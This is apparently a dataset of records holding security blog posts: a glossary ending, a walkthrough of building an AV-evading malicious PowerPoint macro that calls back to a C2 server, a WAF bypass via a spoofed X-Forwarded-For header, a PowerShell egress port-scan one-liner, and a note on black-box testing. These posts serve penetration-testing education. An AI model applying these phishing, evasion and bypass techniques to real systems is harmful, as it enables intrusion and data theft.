centralized resource for computer name to IP address resolution. This is the system that translates a \u201cfriendly name\u201d such as google.com into the IP address that computers use to locate the associated site.\n\nDomain Generating Algorithm\n\nDomain Generating Algorithms are mathematical functions that automatically create ethereal domains with obscure names.  These rogue domains are primarily used for ransomware payments and are quickly closed to evade law enforcement.\n\nDNS Amplification attack\n\nA Distributed Denial of Service attack whereby a group of computers (a botnet) issue DNS requests that appear to come from a single server (the target of the attack).  The requests contain a spoofed IP source address, so all the DNS replies are directed to that source address, causing a flood of traffic which results in a Denial of Service at the targeted machine.\n\nDoS Attack\n\nSee Denial of Service Attack.\n\nDropper\n\nThis is a program that installs (\u201cDrops\u201d) and infected program or other malicious code onto the target machine.\n\nE\n\nEthical Hacking\n\nEthical hacking is the process of identifying potential threats to a company\u2019s security infrastructure and then trying to exploit it, but with permission from the company. An ethical hacker tries to bypass system security and find weak points that someone else might exploit. The benefit to a company is that the ethical hacker is a mock criminal. The goal is for the ethical hacker to find security holes before the real bad guys do. An ethical hacker understands how to respect privacy, what actions are legal and which are illegal, and how to perform the job without actually compromising the security of a company\u2019s infrastructure.\n\nEvil Twin\n\nSee Rogue Access Point\n\nF\n\nFuzzing Test\n\nA software testing technique, often automated or semi-automated, that involves providing invalid, unexpected, or random data to the inputs of a computer program.  \n\nG\n\nGrey box test\n\nTesting done wherein minimal information regarding the makeup, internals, protections and areas of concern are discussed.\n\nH\n\nHash\n\nA process that can be used to map digital data of arbitrary size to digital data of fixed size. The values returned by a hash function are called hash values, hash codes, hash sums, or simply hashes.  A hash function allows one to easily verify that some input data matches a stored hash value, but makes it hard to construct any data that would hash to the same value or find any two unique data pieces that hash to the same value. This principle is used by many password checking systems. See also: Pass the Hash\n\nHeartbleed vulnerability\n\nThe Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs).  More information may be found at http://heartbleed.com/\n\nHost-based Intrusion Detection System (HIDS)\n\nSoftware installed on an endpoint that monitors anomalous activity aimed at that endpoint. (cf. \u201cNetwork-based Intrusion Detection System\u201d.)\n\nHunt Team Exercise\n\nA method used by penetration testers to examine if attackers are inside a target network.  The Pen Testers \u201chunt\u201d for evidence of the presence of intruders.\n\nI\n\nIDS\n\nSee Host-based Intrusion Detection System (HIDS) and Network-based Intrusion Detection System.\n\nIEC\n\nSee International Electrotechnical Commission.\n\nIncident Response\n\nAny activity aligned with preparing and reacting to a security incident.  Usually, a methodical approach used to prepare, respond, record and preserve a security event.  The SANS Institute instructors use the acronym \u201cPICERL\u201d as a mnemonic device for the method; Preparation, Identification, Containment, Eradication, Recovery, Lessons-learned.  See also: Incident Response Team.\n\nIncident Response Team\n\nThis team is generally composed of specific members designated before an incident occurs, although under certain circumstances the team may be an ad hoc group of willing volunteers. Incident response teams are common in corporations as well as in public service organizations.\n\nInput Validation\n\nA method of ensuring that the individual characters provided through user input are consistent with the expected characters of one or more known primitive data types; as defined in a programming language or data storage and retrieval mechanism.  \n\nInternational Electrotechnical Commission (IEC)\n\nA non-profit, non-governmental international standards organization that prepares and publishes International Standards for all electrical, electronic and related technologies \u2013 collectively known as \u201celectrotechnology\u201d.\n\nInternational Organization for Standardization (ISO)\n\nThe world\u2019s largest developer of voluntary international standards. It aims to facilitate world trade by providing common standards between nations.\n\nIntellectual Property\n\nA legal term that refers to creations of the mind. Examples of intellectual property include music, literature, and other artistic works; discoveries and inventions; and words, phrases, symbols, and designs. Under intellectual property laws, owners of intellectual property are granted certain exclusive rights. Some common types of intellectual property rights (IPR) are copyright, patents, and industrial design rights; and the rights that protect trademarks, trade dress, and in some jurisdictions trade secrets. Intellectual property rights are themselves a form of property, called intangible property.\n\nInternet Protocol Address\n\nA unique number assigned to every computer that communicates on the internet. This IP address is used to recognize your particular computer out of the millions of other computers connected to the Internet.\n\nIP Address\n\nSee Internet Protocol Address.\n\nIP\n\nSee Intellectual Property or Internet Protocol Address.\n\nISO\n\nSee International Organization for Standardization.\n\nISO/IEC JTC1\n\nA joint technical committee of the International Organization for Standardization (ISO) and the International Electrotechnical Commission (IEC). Its purpose is to develop, maintain and promote standards in the fields of information technology (IT) and Information and Communications Technology (ICT).\n\nJ\n\nJavascript\n\nA scripting language developed by Netscape and trademarked through Oracle Corporation that executes actions within a browser.  While Javascript can add enhancements to the \u201cbrowsing experience\u201d the automatic execution in a browser makes it the perfect vehicle for two very common exploits: Cross-Site Scripting (XSS) and Cross-Site Request Forgery (XSRF).\n\nL\n\nLateral Movement\n\nNetwork movement whereby the attackers systematically connect to devices on the network in order to get closer to the intended target.\n\nL33tSpeak\n\nLeet (or \"1337\"), also known as eleet or leetspeak, is an alternative alphabet for many languages that is used primarily on the Internet. It uses various combinations of ASCII characters to replace Latinate letters. For example, leet spellings of the word leet include 1337 and l33t; eleet may be spelled 31337 or 3l33t.\n\nThe term leet is derived from the word elite. The leet alphabet is a specialized form of symbolic writing. Leet may also be considered a substitution cipher, although many dialects or linguistic varieties exist in different online communities. The term leet is also used as an adjective to describe formidable prowess or accomplishment, especially in the fields of online gaming and in its original usage \u2013 computer hacking.\n\nM\n\nMac\n\nAbbreviation for Apple Macintosh\u00ae computers and / or the Apple Macintosh\u00ae Operating System (known as \u201cMac OS\u00ae\u201d)\n\nMAC\n\nIn computer security Mandatory Access Control (MAC) is a type of access control in which only the administrator manages the access controls. The administrator defines the usage and access policy, which cannot be modified or changed by users, and the policy will indicate who has access to which programs and files. MAC is most often used in systems where priority is placed on confidentiality.\n\nMAC address\n\nA Media Access Control address (MAC address) is a 48-bit unique identifier assigned to network interfaces for communications on the physical network segment.  A typical MAC address follows the numbering convention F0-1F-AF-02-20-60.  The first 3 number pairs identify the unique manufacturer identifier (in this case, Dell). The following 3 number pairs are unique, as no two network cards should share the same MAC address on the same network or communication problems will occur.   \n\nA list of MAC identifiers may be found at: http://www.adminsub.net/mac-address-finder\n\nMagic Cookie\n\nA token or short packet of data passed between communicating programs, where the data is typically not meaningful to the recipient program. The contents are opaque (meaning that the data structure is not clearly defined) and not usually interpreted until the recipient passes the cookie data back to the sender or perhaps another program at a later time. The cookie is often used like a ticket \u2013 to identify a particular event or transaction.\n\nMalware\n\nSoftware that is written with the intent of causing intentional harm to, or data exfiltration from a system.  The word comes from a combination of the word Malicious and Software. (Cf. Adware, Spyware.)\n\nMan-In-The-Middle (MitM)\n\nAn attack whereby a device is used as a pass-through to capture all traffic before it is sent to its intended destination.  A Man-in-the-Middle attack can be used to steal login credentials  and other sensitive information that is transmitted over an unencrypted connection.\n\nMitM\n\nSee Man-in-the-Middle.\n\nN\n\nNational Institute of Standards and Technology (NIST)\n\nA measurement standards laboratory, also known as a National Metrological Institute (NMI), which is a non-regulatory agency of the United States Department of Commerce. The institute's official mission is to \u201cpromote U.S. innovation and industrial competitiveness by advancing measurement science, standards, and technology in ways that enhance economic security and improve our quality of life.\u201d \n\nNIST documentation in the Computer Security arena is the infamous \u201c800-xx\u201d series) Prior to 1988, known as the National Bureau of Standards. \n\n(NBS) (Web site: http://www.nist.gov/index.html.)\n\nNetwork-based Intrusion Detection System\n\nAn appliance or application that monitors traffic across the entire network to alert against anomalous behavior. (cf. Host-based Intrusion Detection System.)\n\nNicknames\n\nIn recent years, new vulnerabilities have been given nicknames, such as Heartbleed, and POODLE.  This has not been generally well-received in some security circles, as it minimizes the severity of the vulnerability without making the general public understand the gravity of the problem.\n\nNIST\n\nSee National Institute of Standards and Technology.\n\nO\n\nOpen Web Application Security Project (OWASP)\n\nThe Open Web Application Security Project (OWASP) is an online community dedicated to web application security. The OWASP community includes corporations, educational organizations and individuals from around the world. This community works to create freely-available articles, methodologies, documentation, tools, and technologies.\n\n(Web site: https://www.owasp.org/index.php/Main_Page.)\n\nOWASP\n\nSee Open Web Application Security Project.\n\nP\n\nPass the Hash\n\nA technique that allows an attacker to authenticate to a remote server or service by using the underlying hash of a user's password, instead of requiring the associated plaintext password as is normally the case.\n\nPenetration Test\n\nA Penetration Test (a.k.a. Pen Test) is an attack on a computer system with the intention of finding security weaknesses, potentially gaining access to it, its functionality and data.\n\nA pen test follows a formal structure, consisting of defined phases.\n\n(cf. Vulnerability Assessment.)\n\nPersonally Identifiable Information (PII)\n\nInformation that can be used on its own or with other information to identify, contact, or locate a single person, or to identify an individual in context. PII is a legal concept, not a technical concept. Because of the versatility and power of modern re-identification algorithms, the absence of PII data does not mean that the remaining data does not identify individuals. While some attributes may be uniquely identifying on their own, any attribute can be identifying in combination with others. These attributes have been referred to as quasi-identifiers or pseudo-identifiers.\n\nPhishing\n\nThe illegal attempt to acquire sensitive information such as usernames, passwords, and credit card details (and sometimes, indirectly, money), often for malicious reasons, by masquerading as a trustworthy entity in an electronic communication. The word is a neologism created as a homophone of fishing due to the similarity of using fake bait in an attempt to catch a victim. See also\n\nPICERL\n\nSee Incident Response.\n\nPivot Test\n\nA pivot is a method whereby access to a secured network is gained by compromising a machine that resides on a nearby network.  In a typical scenario, Network A is accessible to all machines, but network B is only accessible by a few trusted machines and network B is not accessible from the internet.  By compromising network A and gaining access to a trusted machine that has access to network B, a connection can be leveraged (or pivoted) to the secured network via the compromised machine.\n\nPOODLE Attack\n\nPOODLE is an Acronym for Padding Oracle On Downgraded Legacy Encryption. It is an attack that targets CBC-mode ciphers in SSLv3. The vulnerability allows an active MitM attacker to decrypt content transferred an SSLv3 connection. While secure connections primarily use TLS (the successor to SSL), most users were vulnerable because web browsers and servers will downgrade to SSLv3 if there are problems negotiating a TLS session.\n\nPort\n\nAn easy way to understand ports is to imagine your IP address is a cable box and the ports are the different channels on that cable box. The cable company knows how to send cable to your cable box based upon a unique serial number associated with that box (IP Address), and then you receive the individual shows on different channels (Ports).\n\nProof of Concept (POC)\n\nA proof of concept is a demonstration of a flaw to prove the possibility of the flaw being exploited.\n\nR\n\nRed Team\n\nRed Team / Blue Team exercises take their name from their military antecedents. The idea is simple: One group of security pros--a red team--attacks something, and an opposing group--the blue team--defends it. Originally, the exercises were used by the military to test force-readiness. They have also been used to test physical security of sensitive sites like nuclear facilities and the Department of Energy's National Laboratories and Technology Centers.\n\nRemote Desktop Protocol (RDP)\n\nThe set of rules that allows connections to machines on the network from other connected machines. (RDP usually uses ports 3389.)\n\nRogue Access Point\n\nA Wi-Fi hotspot that mimics a legitimate hotspot.  Users who connect to a rogue access point (also known as an \u201cevil twin\u201d) are susceptible to attack.\n\nS\n\nSANS Institute\n\nThe SANS Institute is a private U.S. company that specializes in information security and cybersecurity training. Since its founding in 1989, the SANS Institute has trained over 120,000 information security professionals in topics ranging from cyber and network defenses, penetration testing, incident response, digital forensics, and audit. The trade name SANS derives from SysAdmin, Audit, Networking, and Security.  SANS also publishes the \u201cCritical Security Controls for Effective Cyber Defense\u201d. As defined by SANS, \u201cThe actions defined by the Controls are demonstrably a subset of the comprehensive catalog defined by the National Institute of Standards and Technology (NIST) SP 800-53. The Controls do not attempt to replace the work of NIST, including the Cybersecurity Framework developed in response to Executive Order 13636. The Controls instead prioritize and focus on a smaller number of actionable controls with high-payoff.  \n\nSecure Shell (SSH)\n\nA network protocol for initiating text-based sessions on remote machines in a secure way. (Usually initiated over TCP port 22.)\n\nSecure Sockets Layer (SSL)\n\nSSL (Secure Sockets Layer) was the standard security technology for establishing an encrypted link between a web server and a browser. This link ensured that all data passed between the web server and browsers remain private and integral. SSL was an industry standard and was used by millions of websites in the protection of their online transactions with their customers.  Dr. Taher Elgamal, chief scientist at Netscape Communications from 1995 to 1998, is recognized as the \"father of SSL\".\n\nAs of 2014 the 3.0 version of SSL is considered insecure as it is vulnerable to the POODLE attack that affects all block ciphers in SSL; and RC4, the only non-block cipher supported by SSL 3.0, is also feasibly broken as used in SSL 3.0. TLS is now the recommended encryption standard for Web-based communications.\n\nServer Message Block (SMB)\n\nA protocol used for providing shared access to files, printers, and serial ports and miscellaneous communications between nodes on a network. It also provides an authenticated inter-process communication mechanism. (SMB usually communicates over port 139.)\n\nSession Hijacking\n\nAlso known as cookie hijacking, session hijacking is the exploitation of a valid computer session\u2014sometimes also called a session key\u2014to gain unauthorized access to information or services in a computer system. In particular, it is used to refer to the theft of a magic cookie used to authenticate a user to a remote server. It has particular relevance to web developers, as the HTTP cookies used to maintain a session on many web sites can be easily stolen by an attacker using an intermediary computer or with access to the saved cookies on the victim's computer.\n\nSide-Channel communication\n\nSee Covert Channel.\n\nSMB\n\nSee Server Message Block.\n\nSocial Engineering\n\nA type of confidence trick for the purpose of information gathering, fraud, or system access.  It differs from a traditional \"con\" in that it is often one of many steps in a more complex fraud scheme.\n\nSpear Phishing\n\nA phishing attack that is directed at a specific individual or company.  Attackers will gather information about the target when crafting the fraudulent message to increase the likelihood of success.  See also: Phishing, Clone Phishing, Watering Hole Attack, Whaling.\n\nSpyware\n\nSoftware that is installed in a computer without the user's knowledge and transmits information about the user's computer activities over the Internet. (Cf. Adware, Malware.)\n\nSSH\n\nSee Secure Shell (SSH).\n\nSSL\n\nSee Secure Sockets Layer\n\nStructured Query Language\n\nCommonly referred to as \u201cSQL\u201d (pronounced: see-Kwell), Structured Query Language is a special-purpose programming language designed for managing data held in a relational database management system (RDBMS), or for stream processing in a relational data stream management system (RDSMS).  \n\nSQL\n\nSee Structured Query Language.\n\nSQL Injection\n\nA method of attack whereby false data is entered into a web form to see if a vulnerable SQL database is in use, and if so, commands may be entered (injected) into the web form field to force the SQL database to return unintended results (including full admin permission to the database).  A common SQL injection command is: ' OR '1'='1\n\nT\n\nTLS\n\nSee Transport Layer Security\n\nTransport Layer Security\n\nTransport Layer Security (TLS) and its predecessor, Secure Sockets Layer (SSL), both of which are frequently referred to as 'SSL', are cryptographic protocols designed to provide communications security over a computer network. TLS is the standard security technology for establishing an encrypted link between a web server and a browser. This link ensures that all data passed between the web server and browsers remain private and integral.\n\nU\n\nUniform Resource Indicator (URI)\n\nA string of characters used to identify a name of a resource. Such identification enables interaction with representations of the resource over a network, typically the World Wide Web, using specific protocols. Schemes specifying a concrete syntax and associated protocols define each URI. The most common form of URI is the uniform resource locator (URL), frequently referred to informally as a web address.\n\nUniform Resource Locator (URL)\n\nThe addressing scheme used to locate a particular web site or web page,\n\ne.g., http://www.CTW.org  \n\nURI\n\nSee Uniform Resource Indicator.\n\nURL\n\nSee Uniform Resource Locator.\n\nV\n\nVishing\n\nThe criminal practice of using Social Engineering over the telephone system to gain access to private personal and financial information from the public for the purpose of financial reward. The word is a combination of \"voice\" and phishing. Voice phishing is typically used to steal credit card numbers or other information used in identity theft schemes from individuals. See also Phishing,\n\nVulnerability Assessment\n\nThe process of identifying, quantifying, and prioritizing the vulnerabilities in a system.\n\n(cf. Penetration Test.)\n\nW\n\nWatering Hole Attack\n\nAn attack whereby the attacker compromises a site likely to be visited by a particular target group, rather than attacking the target group directly. Eventually, someone from the targeted group visits the \u201ctrusted\u201d site (A.K.A. the \u201cWatering Hole\u201d) and becomes compromised. See Also: Phishing, Spear Phishing, Whaling, and Clone Phishing.\n\nWhaling\n\nA Spear Phishing attack directed specifically at senior executives and other high profile targets within businesses.  See also: Phishing, Spear Phishing, Watering Hole Attack and Clone Phishing.\n\nX\n\nXSS\n\nSee Cross-Site Scripting.\n\nXSRF\n\nSee Cross-Site Request Forgery.\n\nZ\n\nZero-Day Vulnerability\n\nA flaw for which a patch does not yet exist.\n\nZero-Day Exploit\n\nA tool that has been written to take advantage of a Zero-Day Vulnerability.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Click to Enable Content\"\nTaxonomies: \"C2, Red Team, anti-virus, BHIS favorite office sports, blacklisting, C2, evading anti-virus, Kill your AV, macros, microsoft office, veil-evasion\"\nCreation Date: \"Fri, 01 Apr 2016 14:03:24 +0000\"\nSally Vandeven //\n\nEvading anti-virus scanners has become a bit of a sport around BHIS.  When we do C2 testing for our customers we start with a host on the internal network and create a reverse connection out to our C2 server.  We then proceed to send various types of data in and out to see if we get caught.  The goal is to demonstrate how well their defenses prevent and/or detect our shenanigans. Our success rate is quite high (meaning we usually are able to exfil data out of the network) and the primary reason for that is because identifying evil traffic can be very difficult!  Attackers can obfuscate their traffic so that anti-virus scanners and other security devices do not detect a hint of wrong-doing.  Typically, anti-virus scanners and intrusion prevention/detection engines block or alert on known bad signatures or behaviors.  This is a blacklist approach.  So as long as we can change our traffic from known bad to anything else we can cruise right on by.  So how do we get that initial connection out from the internal network to our C2 server without being noticed?  Sometimes a simple PowerShell script that connects out to a Metasploit listener will do the trick.  And other times we have to try a little harder.\n\nOn a recent test I was working on, we used a malicious PowerPoint presentation masquerading as an interesting slideshow that promised to reveal irresistible company gossip.  The \u201curge to click\u201d rating was high.  Embedded in the PowerPoint presentation were Visual Basic commands that invoked a PowerShell script to connect out to a C2 server.  The script was obfuscated using the awesome Veil-Evasion tool.  Here is the run down\u2026.\n\nFirst, we set up the listener on our C2 server. In this example, we are listening on port 443 using a reverse TCP connection.  We selected port 443 because it is normally allowed outbound.\n\nNext, we created our payload using Veil-Evasion.  We only had to tell Veil-Evasion the address and port we wanted to connect to as well as the type of payload and it did all the rest.\n\nThe script generated by Veil-Evasion looks like this:\n\nVeil-Evasion Obfuscated Script\n\nAs you can see above, Veil-evasion creates the script but there is one problem; the script is a one-liner that in this case consists of 2300 characters:\n\n2300 Characters, One Line Script\n\nThe Visual Basic editor in Office will not be happy about this at all.  As a matter of fact, this will cause an error.  We need to find a way to break this script into smaller pieces that the VB compiler can deal with. Fortunately, someone has already done that for us.  Macro_safe.py is a neat little python script written to solve just this problem.  After running the output through the macro_safe.py script we get a version of our malicious script that PowerPoint will happily digest.\n\nMacro_safe.py Breaks Long Lines Into Shorter Lines for Visual Basic\n\nThe next step then is to open up our PowerPoint presentation and add the \u201cmacro safe\u201d code. First, we make sure we have access to the \u201cDeveloper\u201d tab in PowerPoint by adding it to the Ribbon if necessary. This can be done via the PowerPoint Options.\n\nEnabling Developer Tab in PowerPoint\n\nBefore PowerPoint will allow us to create a Macro, we need to save the presentation as type  .pps (PowerPoint 97-2003 Show) or .ppsm (PowerPoint Macro-Enabled Show).  I like the legacy.pps extension because the \u201cm\u201d in newer versions of Office gives yet another clue that something is fishy.  Then we click on the Developer tab, open up the Visual Basic interface and insert a new module.  This is where we paste in the \u201cmacro safe\u201d output containing the properly formatted Veil-Evasion script. These steps are shown below.\n\nOnce the macro exists in the document we need to find a way to trigger its execution.  Microsoft Word and Excel both have options for running Macros automatically when the file is opened but PowerPoint does not.  I have heard and read about hacks to accomplish the same in PowerPoint but, in this case, we will simply use Custom Actions in the presentation to trigger execution of the code when the user clicks inside the slideshow.  I have created one text box that covers the entire first slide and applied the \u201cOn Mouse Click\u201d action there.  So when the user opens the presentation and clicks anywhere in the textbox on the first slide the macro executes and an outbound connection is created.  One could also choose to execute the macro \u201cOn Mouse Over\u201d as well, however, this may be a bit noisier as it will likely create multiple outbound connections.\n\nBut wait, macros are typically not enabled by default so the user would have to agree to this, right?  Yep. It turns out that PowerPoint will display a very clear warning that this document could be malicious.  \u201cYou should leave this content disabled unless the content provides critical functionality and you trust its source\u201d.  You might think this is a descriptive, understandable warning and would be enough to prevent users from enabling the unknown content.  But it turns out\u2026..\n\n\u2026if you send it \u2013 they will click. That is what the attackers are counting on.  Now don\u2019t get me wrong. I am not saying that users should always know better.  The Internet is full of warnings and security personnel regularly allow untrusted certificates to be used that users are told to \u201cclick through\u201d.  Let\u2019s face it \u2013 users get mixed messages so often that it is no surprise they have error message fatigue. Basically, when a user really wants to view the contents of a document s/he will click through almost any warning without realizing that very quietly in the background, something bad is happening \u2013 in this case their machine is reaching out to our C2 server.\n\nWith initial access to the machine the attacker can then proceed to upload or download files, attempt to elevate privileges, pivot to other machines, etc.\n\nOur goal at BHIS is to educate our customers about the dangers of trusting anti-virus products to catch everything, as well as, the potential consequences of ignoring security warnings.  So to that end, this Veil-Evasion obfuscated PowerPoint document was scanned with the Gmail scanner, Windows Defender, McAfee A/V and Symantec A/V.  None of these tools detected malicious content.  Check it out:\n\nGmail Fails to Detect the Malicious Document\n\nMcAfee Fails\n\nWindows Defender Fails\n\nSymantec ........ Nope\n\nThe bottom line?  The only sign of trouble in our example here was a single warning from PowerPoint about enabling active content on a PowerPoint presentation and it was up to the end user to decide whether or not to proceed.  If users must make these decisions they must be continuously educated on the potential dangers with which they are faced.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Three Minutes with the HTTP TRACE Method\"\nTaxonomies: \"Author, Brian King, Red Team, Web App, cross site tracing, http trace, OWASP, trace request, WAF bypass\"\nCreation Date: \"Mon, 04 Apr 2016 17:59:35 +0000\"\nBrian King //\n\nAll of our scanning tools tell us that we should disable the HTTP TRACE and TRACK methods. And we all think that\u2019s because there\u2019s something an attacker can do with it to steal secrets from legitimate users. But there\u2019s another thing TRACE can do for an attacker, and it\u2019s got nothing to do with other users.\n\nOWASP says you should disable HTTP TRACE because it can be used for Cross Site Tracing.\n\nhttps://www.owasp.org/index.php/Cross_Site_Tracing\n\nCERT says it can be \u201ccombined with cross-domain browser vulnerabilities to read sensitive header information from third-party domains.\u201d\n\nhttps://www.kb.cert.org/vuls/id/867593\n\nDeadliest (!) Web Attacks says you can read cookies.\n\nCross-Site Tracing (XST): The misunderstood vulnerability\n\nAll of those are correct, but a little old. In modern browsers, XMLHttpRequest won\u2019t send a \u201cTRACE\u201d request anymore, and the CORS framework prevents XHR requests to foreign sites that don\u2019t explicitly allow them. So these old attacks don\u2019t work so well anymore.\n\n CORS Blocks GET Requests, and Your Browser Blocks TRACE Requests \n\nBut! It\u2019s still a useful information-getter. Remember that the TRACE verb is handled by the webserver. Your request may pass through something else on the way to the webserver. If that something else adds headers, then your TRACE response will include those headers, and you\u2019ll gain a little information you didn\u2019t already have.\n\nWhat sits in front of a webserver that might be interesting? A Web Application Firewall (WAF), which may be filtering requests to detect and kill attacks before they get to the webserver.\n\n Those are not the headers I sent\u2026 \n\nThe X-Forwarded-For header is one of the headers added by some WAFs, and it is sometimes used by the WAF itself to decide if it should filter that request or not. If the header is present and contains the IP address of the WAF, then the request must have come from the WAF, and it must not be malicious, right?\n\nWell, what if we add one of those to the request we send?\n\n Hey, Look. My X-Forwarded-For Made It Through. \n\nThis WAF doesn\u2019t just create the X-Forwarded-For header, it adds the requesting system\u2019s IP address (my public IP address, ending in 103) to whatever may already be there. If you know the IP address of the WAF (and you do because you\u2019re talking to it), you can try to tell the WAF that your request is actually the WAF\u2019s request, and should be ignored. If it believes you, then you\u2019ve bypassed the WAF.\n\nThis is the most straightforward WAF bypass. This is not a new discovery at all, but the TRACE verb here shows you why it can work.\n\nIf you want to play with it at home, here\u2019s the HTML I used for the XHR illustration above:\n\nTRACE Form\nResponse Goes Here\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Poking Holes in the Firewall: Egress Testing With AllPorts.Exposed\"\nTaxonomies: \"Author, Beau Bullock, C2, External/Internal, Red Team, Beau Bullock, egress filtering, exposed ports, firewalls, network\"\nCreation Date: \"Wed, 06 Apr 2016 14:02:38 +0000\"\nBeau Bullock //\n\nIf you have been even remotely in touch with technology in the past thirty years you have probably heard of this thing called a \"firewall\". If not, a \"firewall\" decides what does and does not get to proceed through it. Most organizations have one of these protecting their network from the rest of the Internet. Some organizations place them in the most opportune spots to segment off specific areas of their internal network. The system you are using right now to read this blog post most likely has a firewall built-in.\n\nThe general consensus about what a firewall does is that it keeps \"bad stuff\" from entering a protected network or system. But firewalls can also keep things from leaving a network or system. This is called \"egress filtering\".\n\nWhy Should We Care What Leaves?\n\nThe simple answer is the more ports allowed out, the easier it is for an attacker to establish command and control. If there are no outbound filters put in place an organization can quickly lose visibility into what is leaving the network. This can lead to malware infections, command and control sessions going unnoticed, or insider employees getting around corporate network policies.\n\nIf you are the one in charge of the firewall at your organization, how do you go about knowing what is allowed out of your network quickly without diving into your firewall rule sets?\n\nIf you are a pentester, how can you quickly find out what ports are allowed out of a network that can be used as a command and control channel?\n\nAllPorts.Exposed\n\nAllPorts.Exposed is an Internet-resident system with (as the name suggests) all 65535 TCP ports open on it. If you were to portscan it from a system/network without firewall protection you should see that all ports are \"open\". Now, if you were to portscan this system from within your network protected by a firewall, and you see open ports, these ports can be assumed as being allowed outbound through the firewall.\n\nHow To Test It?\n\nYes, you could use something like Nmap to do a simple portscan but I prefer PowerShell for this task as it is built into Windows operating systems. Often-times, when we are performing a pentest we are working from a Windows-based system and are typically not an administrator user. So, installing external tools can be difficult.\n\nHere is a short PowerShell portscanning script you can use to test ports 1-1024 against allports.exposed.\n\nOpen up a command terminal.\n\nType \u2018powershell.exe -exec bypass\u2019 and hit enter.\n\nCopy the below script into the terminal window and run it.\n\n1..1024 | % {$test= new-object system.Net.Sockets.TcpClient; $wait = $test.beginConnect(\"allports.exposed\",$_,$null,$null); ($wait.asyncwaithandle.waitone(250,$false)); if($test.Connected){echo \"$_ open\"}else{echo \"$_ closed\"}} | select-string \" \"\n\nIn the following screenshot you can see where the script prints \u2018open\u2019 to the terminal window for ports that were discovered as being open.\n\nAlternatively, if you would like to just check for certain ports you can comma-separate each port you would like to scan at the beginning of the script in place of \u201c1..1024\u201d. For example, the following script will only scan ports 21, 22, 23, 25, 80, 443, and 1337.\n\n21,22,23,25,80,443,1337 | % {$test= new-object system.Net.Sockets.TcpClient; $wait =$test.beginConnect(\"allports.exposed\",$_,$null,$null); ($wait.asyncwaithandle.waitone(250,$false)); if($test.Connected){echo \"$_ open\"}else{echo \"$_ closed\"}} | select-string \" \"\n\nHere is the same script, but this time we are testing the top 128 ports in use on the Internet as defined by the Nmap project.\n\n80,23,443,21,22,25,3389,110,445,139,143,53,135,3306,8080,1723,111,995,993,5900,1025,587,8888,199,1720,465,548,113,81,6001,10000,514,5060,179,1026,2000,8443,8000,32768,554,26,1433,49152,2001,515,8008,49154,1027,5666,646,5000,5631,631,49153,8081,2049,88,79,5800,106,2121,1110,49155,6000,513,990,5357,427,49156,543,544,5101,144,7,389,8009,3128,444,9999,5009,7070,5190,3000,5432,3986,13,1029,9,6646,49157,1028,873,1755,2717,4899,9100,119,37,1000,3001,5001,82,10010,1030,9090,2107,1024,2103,6004,1801,19,8031,1041,255,3703,17,808,3689,1031,1071,5901,9102,9000,2105,636,1038,2601,7000 | % {$test= new-object system.Net.Sockets.TcpClient; $wait =$test.beginConnect(\"allports.exposed\",$_,$null,$null); ($wait.asyncwaithandle.waitone(250,$false)); if($test.Connected){echo \"$_ open\"}else{echo \"$_ closed\"}} | select-string \" \"\"\n\nIn conclusion, knowing what ports are allowed out of a network is very important for both pentesters and network admins. Each port allowed outbound from a network creates an additional exit point for attackers to utilize. BHIS recommends locking down egress traffic to only the ports required for the business to function. If possible, implement a web proxy and only allow outbound web traffic from it. Block all outbound traffic from client systems, and force their web browsers to use the web proxy to perform web browsing.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Black Box testing  Are you testing the Pentester, or your target?\"\nTaxonomies: \"InfoSec 101, all about black box testing, black box pentesting, black box testing\"\nCreation Date: \"Fri, 08 Apr 2016 12:55:21 +0000\"\nMike Perez //\n\nBHIS does a lot of outreach via our blog, HackNaked.TV, training, and especially webcasts.  In the course of outreach, sometimes folks come to us whom never had a pentest, or interestingly, had a pentest and are unhappy with the results.  \nWhen probing customers about those unhappy results, many of those experiences seem to have two common elements: Black Box testing and/or more fundamentally, mismatched expectations.\nNow Black Box testing definitely has its place.  Examples might include:\n\nYour new application has security reviews baked into the development cycle.\nYou perform your own internal pentests. \nYour site has been pentested in a Grey or Crystal Box fashion recently.\nYou\u2019re testing whether your SOC or Incident Response team is actually escalating issues.\n\nHowever, if none of the above applies and you decide your very first pentest will be a Black Box test, you're actually testing the pentester, and not testing the target. \nThe more cooperative the test, the more we\u2019re spending time testing the application or target.  The more Black Box the test, the more time the pentester will spend on discovery, guesswork, and exploration.  Pentesters love the challenge, but here's where the 2nd piece comes in: mismatched expectations.  The problem is when the pentester misses an issue due to concentrating on an area of the application that the customer wasn't really worried about.  In the example of a network pentest with numerous hosts, the pentester will not know to focus on targets that may actually be more valuable to the customer or harbor more risk for the organization.  \nAnother point that often comes up with Black Box testing regarding mismatched expectations are the Lessons Learned resulting from the report.  Most engagements are a week.  When the target list or application isn\u2019t given the full scope it could have, the the results of the testing may not be representative of the actual risk of the application/target set for the other 360 days of the year.  Customers are paying for our help in making them better and for bringing issues to the surface that may be exploited by a real attacker.  It\u2019s important to make the most effective use of that valuable time in helping the customer get better.  A determined attacker will spend as long as it takes \u2013 why give real attackers an advantage by treating your yearly test as an adversarial engagement with little information?\nFor many of our customers, we recommend doing a hybrid test \u2013 Phase 1 will be a Black Box for a very defined time delimited phase, immediately followed by a meeting with the customer to obtain additional information for a cooperative test for Phase 2.  This seems to be the best of both worlds and leads to a report that combines both testing styles.\nSo, if you\u2019re considering a Black box test for your next engagement, be sure you decide ahead of time \u2013 what are you actually testing?  A reputable penetration testing company will help you define scope items based off of your goals and provide you with tips to maximize the testing time and process.\n\n"
    },
    {
        "input": "",
        "instruction": "",
